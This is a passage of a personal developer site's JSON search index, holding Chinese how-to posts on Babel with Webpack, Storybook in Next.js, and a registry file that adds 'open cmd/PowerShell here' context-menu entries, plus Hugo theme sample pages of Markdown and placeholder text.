7\u0026quot;]\r}\r}]\r]\r}\r或“不需要浏览器支持，只需使用Node.js 6.10”\n{\r\u0026quot;presets\u0026quot;: [\r[\u0026quot;env\u0026quot;, {\r\u0026quot;targets\u0026quot;: {\r\u0026quot;node\u0026quot;: \u0026quot;6.10\u0026quot;\r}\r}]\r]\r}\r在编写React应用程序时，react预设非常方便：添加预设preset-flow，syntaxjsx，transform-react-jsx，transform-react-display-name。\n通过包含它，您已经准备好使用JSX转换和Flow支持来开发React应用程序。\n有关预设的更多信息\nhttps://babeljs.io/docs/plugins/\n四、将Babel与Webpack一起使用 如果您想在浏览器中运行现代JavaScript，单凭Babel是不够的，您还需要bundle捆绑代码。 Webpack是实现此目的的完美工具。\n提示：如果您不熟悉webpack，请阅读webpack指南\n现代JS需要两个不同的阶段：编译阶段和运行时阶段。 这是因为某些ES6 +功能需要polyfill或runtime帮助程序。\n要安装Babel polyfill和runtime助手，请运行\nnpm install @babel/polyfill @babel/runtime @babel/plugin-transform-runtime\r现在在您的webpack.config.js文件中添加：\nentry: [\r'babel-polyfill',\r// your app scripts should be here\r],\rmodule: {\rloaders: [\r// Babel loader compiles ES2015 into ES5 for\r// complete cross-browser support\r{\rloader: 'babel-loader',\rtest: /\\.js$/,\r// only include files present in the `src` subdirectory\rinclude: [path.resolve(__dirname, \u0026quot;src\u0026quot;)],\r// exclude node_modules, equivalent to the above line\rexclude: /node_modules/,\rquery: {\r// Use the default ES2015 preset\r// to include all ES2015 features\rpresets: ['es2015'],\rplugins: ['transform-runtime']\r}\r}\r]\r}\r通过将预设和插件信息保留在webpack.config.js文件中，我们可以避免使用.babelrc文件。\n五、Babel 的缺陷 转码当然会损耗性能，如果追求极致性能，可排除。\n","description":"","id":63,"section":"others","tags":null,"title":"Babel","uri":"https://danacoding.github.io/others/babel/babel-base/"},{"content":"一、安装配置  在next.js项目中执行\n npx sb init\ryarn storybook\r .storybook/preview.js 为 Storybook 配置 Next.js Images\n + import * as NextImage from \u0026quot;next/image\u0026quot;;\r+ const OriginalNextImage = NextImage.default;\r+ Object.defineProperty(NextImage, \u0026quot;default\u0026quot;, {\rconfigurable: true,\rvalue: (props) =\u0026gt; (\r\u0026lt;OriginalNextImage\r{...props}\runoptimized\r/\u0026gt;\r),\r});\r package.json 为 Storybook 提供 Next.js 公共目录\n {\r...\r\u0026quot;scripts\u0026quot;: {\r- \u0026quot;storybook\u0026quot;: \u0026quot;start-storybook -p 6006\u0026quot;,\r- \u0026quot;build-storybook\u0026quot;: \u0026quot;build-storybook\u0026quot;\r+ \u0026quot;storybook\u0026quot;: \u0026quot;start-storybook -p 6006 -s ./public\u0026quot;,\r+ \u0026quot;build-storybook\u0026quot;: \u0026quot;build-storybook -s public\u0026quot;\r},\r...\r}\r 配置全局样式，这里使用 antd\n yarn add antd\r// `.storybook/preview.js` 为 Storybook 配置全局样式\rimport 'antd/dist/antd.css';\rexport const parameters = {\r...\r...\rlayout: 'fullscreen'\r};\r二、编写故事流程 （组件 -\u0026gt; 故事）  故事细节\n 三、args 获取 状态数据 和 事件  使用其他故事的 args\n  传递给Storybook的事件的写法 (必须带有 \u0026hellip;props, 否则事件无法触发)\n 四、parameters 静态参数 \u0026amp; loaders 加载器 parameters 通常用于控制 Storybook 功能和插件的行为。（一般情况下不需要使用，但不可不知）\nloaders 用于加载故事的数据，加载器可用于加载任何资产、延迟加载组件或从远程 API 获取数据。（一般不需要使用，但不可不知）\n","description":"CDD组件驱动开发的理想方案，确实用起来能够将项目逻辑滤清且印象深刻。","id":64,"section":"react","tags":null,"title":"Storybook 基础","uri":"https://danacoding.github.io/react/storybook/sb-base/"},{"content":"直接新建txt，粘贴进去保存，然后选择另存为，保存类型选所有文件、编码选ANSI、文件名为CmdAndPowershellAll.reg(名字无所谓，后缀为.reg就可以)。双击安装。\nWindows Registry Editor Version 5.00\r; 原文链接：\r; https://blog.csdn.net/cxrsdn/article/details/84538767\r; 若原先有，先删除原来的\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere]\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\r[-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin]\r; 1.右键：命令行\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere]\r@=\u0026quot;在此处打开命令行窗口\u0026quot;\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHere\\command]\r@=\u0026quot;cmd.exe -noexit -command Set-Location -literalPath \\\u0026quot;%V\\\u0026quot;\u0026quot; ; 2.右键：命令行（管理员）\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas]\r@=\u0026quot;在此处打开命令行窗口(管理员)\u0026quot;\r\u0026quot;ShowBasedOnVelocityId\u0026quot;=dword:00639bc8\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\runas\\command]\r@=\u0026quot;cmd.exe /s /k pushd \\\u0026quot;%V\\\u0026quot;\u0026quot;\r; 3.shift+右键：Powershell(管理员)\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin]\r@=\u0026quot;在此处打开 Powershell 窗口(管理员)\u0026quot;\r\u0026quot;Extended\u0026quot;=\u0026quot;\u0026quot;\r[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\PowershellAdmin\\command]\r@=\u0026quot;\\\u0026quot;C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\u0026quot; -windowstyle hidden -Command $stpath = pwd; Start-Process PowerShell -ArgumentList \\\\\\\u0026quot;-NoExit\\\\\\\u0026quot;, \\\\\\\u0026quot;-Command Set-Location -literalPath '%V'\\\\\\\u0026quot; -verb RunAs\u0026quot;\r; 4.设置右键 管理员打开cmd的另一种方法（可用来替换上面的2）\r; 通过Powershell调起，会闪过一次Powershell的窗口，去掉下面几行的[; ]可以取消注释\r; [-HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin]\r; ; [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin]\r; @=\u0026quot;在此处打开命令行窗口(管理员)\u0026quot;\r; ; [HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\OpenCmdHereAdmin\\command]\r; @=\u0026quot;PowerShell -windowstyle hidden -Command \\\u0026quot;Start-Process cmd.exe -ArgumentList '/s,/k, pushd,%V' -Verb RunAs\\\u0026quot;\u0026quot;\r","description":"","id":65,"section":"others","tags":null,"title":"右键添加cmd和psl窗口命令","uri":"https://danacoding.github.io/others/cmd/cmdpsl/"},{"content":"Markdown here\n","description":"test post","id":66,"section":"docs","tags":null,"title":"Related content","uri":"https://danacoding.github.io/docs/relatedcontent/"},{"content":"Markdown here\n","description":"test post","id":67,"section":"docs","tags":null,"title":"Page Resources","uri":"https://danacoding.github.io/docs/pageresources/"},{"content":"Markdown here\n","description":"test post","id":68,"section":"docs","tags":null,"title":"Page Bundles","uri":"https://danacoding.github.io/docs/pagebundles/"},{"content":"Markdown here\n","description":"test post","id":69,"section":"docs","tags":null,"title":"Content Formats","uri":"https://danacoding.github.io/docs/contentfortmats/"},{"content":"Markdown here\n","description":"test post","id":70,"section":"docs","tags":null,"title":"Image Processing","uri":"https://danacoding.github.io/docs/imageprocessing/"},{"content":"Markdown here\n","description":"test post","id":71,"section":"docs","tags":null,"title":"Shortcodes","uri":"https://danacoding.github.io/docs/contentmanagement/shortcodes/"},{"content":"Markdown here\n","description":"test post","id":72,"section":"docs","tags":null,"title":"Frontmatter","uri":"https://danacoding.github.io/docs/contentmanagement/frontmatter/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nThis article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\n\rHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rCode block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"","id":73,"section":"blog","tags":["markdown","css","html","themes"],"title":"Markdown Syntax Guide","uri":"https://danacoding.github.io/blog/markdown-syntax/"},{"content":"This article offers a sample of basic Markdown syntax that can be used in Hugo content files, also it shows whether basic HTML elements are decorated with CSS in a Hugo theme.\nHeadings The following HTML \u0026lt;h1\u0026gt;—\u0026lt;h6\u0026gt; elements represent six levels of section headings. \u0026lt;h1\u0026gt; is the highest section level while \u0026lt;h6\u0026gt; is the lowest.\nH1 H2 H3 H4 H5 H6 Paragraph Xerum, quo qui aut unt expliquam qui dolut labo. Aque venitatiusda cum, voluptionse latur sitiae dolessi aut parist aut dollo enim qui voluptate ma dolestendit peritin re plis aut quas inctum laceat est volestemque commosa as cus endigna tectur, offic to cor sequas etum rerum idem sintibus eiur? Quianimin porecus evelectur, cum que nis nust voloribus ratem aut omnimi, sitatur? Quiatem. Nam, omnis sum am facea corem alique molestrunt et eos evelece arcillit ut aut eos eos nus, sin conecerem erum fuga. Ri oditatquam, ad quibus unda veliamenimin cusam et facea ipsamus es exerum sitate dolores editium rerore eost, temped molorro ratiae volorro te reribus dolorer sperchicium faceata tiustia prat.\nItatur? Quiatae cullecum rem ent aut odis in re eossequodi nonsequ idebis ne sapicia is sinveli squiatum, core et que aut hariosam ex eat.\nBlockquotes The blockquote element represents content that is quoted from another source, optionally with a citation which must be within a footer or cite element, and optionally with in-line changes such as annotations and abbreviations.\nBlockquote without attribution  Tiam, ad mint andaepu dandae nostion secatur sequo quae.\nNote that you can use Markdown syntax within a blockquote.\n Blockquote with attribution  Don\u0026rsquo;t communicate by sharing memory, share memory by communicating.\n— Rob Pike1\n Tables Tables aren\u0026rsquo;t part of the core Markdown spec, but Hugo supports supports them out-of-the-box.\n   Name Age     Bob 27   Alice 23    Inline Markdown within tables    Inline  Markdown  In  Table     italics bold strikethrough  code    Code Blocks Code block with backticks html\r\u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\rCode block indented with four spaces \u0026lt;!DOCTYPE html\u0026gt;\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt;\r\u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt;\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r Code block with Hugo\u0026rsquo;s internal highlight shortcode 1 2 3 4 5 6 7 8 9 10  \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Example HTML5 Document\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;p\u0026gt;Test\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   List Types Ordered List  First item Second item Third item  Unordered List  List item Another item And another item  Nested list  Item  First Sub-item Second Sub-item    Other Elements — abbr, sub, sup, kbd, mark GIF is a bitmap image format.\nH2O\nXn + Yn = Zn\nPress CTRL+ALT+Delete to end the session.\nMost salamanders are nocturnal, and hunt for insects, worms, and other small creatures.\n The above quote is excerpted from Rob Pike\u0026rsquo;s talk during Gopherfest, November 18, 2015.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n  ","description":"Sample article showcasing basic Markdown syntax and formatting for HTML elements.","id":74,"section":"docs","tags":["markdown","css","html","themes"],"title":"Section","uri":"https://danacoding.github.io/docs/contentmanagement/sections/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\ninhospita parcite confusaque translucet patri vestro qui optatis\nlumine cognoscere flos nubis! Fronde ipsamque patulos Dryopen deorum.\n Exierant elisi ambit vivere dedere Duce pollice Eris modo Spargitque ferrea quos palude  Rursus nulli murmur; hastile inridet ut ab gravi sententia! Nomine potitus\nsilentia flumen, sustinet placuit petis in dilapsa erat sunt. Atria\ntractus malis.\n Comas hunc haec pietate fetum procerum dixit Post torum vates letum Tiresia Flumen querellas Arcanaque montibus omnes Quidem et  Vagus elidunt \nThe Van de Graaf Canon\nMane refeci capiebant unda mulcebat Victa caducifer, malo vulnere contra\ndicere aurato, ludit regale, voca! Retorsit colit est profanae esse virescere\nfurit nec; iaculi matertera et visa est, viribus. Divesque creatis, tecta novat collumque vulnus est, parvas. Faces illo pepulere tempus adest. Tendit flamma, ab opes virum sustinet, sidus sequendo urbis.\nIubar proles corpore raptos vero auctor imperium; sed et huic: manus caeli\nLelegas tu lux. Verbis obstitit intus oblectamina fixis linguisque ausus sperare\nEchionides cornuaque tenent clausit possit. Omnia putatur. Praeteritae refert\nausus; ferebant e primus lora nutat, vici quae mea ipse. Et iter nil spectatae\nvulnus haerentia iuste et exercebat, sui et.\nEurytus Hector, materna ipsumque ut Politen, nec, nate, ignari, vernum cohaesit sequitur. Vel mitis temploque vocatus, inque alis, oculos nomen non silvis corpore coniunx ne displicet illa. Crescunt non unus, vidit visa quantum inmiti flumina mortis facto sic: undique a alios vincula sunt iactata abdita! Suspenderat ego fuit tendit: luna, ante urbem\nPropoetides parte.\n","description":"","id":75,"section":"blog","tags":["markdown","text"],"title":"Placeholder Text","uri":"https://danacoding.github.io/blog/placeholder-text/"},{"content":"Lorem est tota propiore conpellat pectoribus de\npectora summo. Redit teque digerit hominumque toris verebor lumina non cervice\nsubde tollit usus habet Arctonque, furores quas nec ferunt. Quoque montibus nunc\ncaluere tempus\nEmoji can be enabled in a Hugo project in a number of ways.\n\rThe emojify function can be called directly in templates or Inline Shortcodes.\nTo enable emoji globally, set enableEmoji to true in your site’s configuration and then you can type emoji shorthand codes directly in content files; e.g.\n🙈 🙈 🙉 🙉 🙊 🙊\nThe Emoji cheat sheet is a useful reference for emoji shorthand codes.\nN.B. The above steps enable Unicode Standard emoji characters and sequences in Hugo, however the rendering of these glyphs depends on the browser and the platform. To style the emoji you can either use a third party emoji font or a font stack; e.g.\n1 2 3  .emoji { font-family: Apple Color Emoji,Segoe UI Emoji,NotoColorEmoji,Segoe UI Symbol,Android Emoji,EmojiSymbols; }  ","description":"","id":76,"section":"blog","tags":["emoji"],"title":"Emoji Support","uri":"https://danacoding.github.io/blog/emoji-support/"}]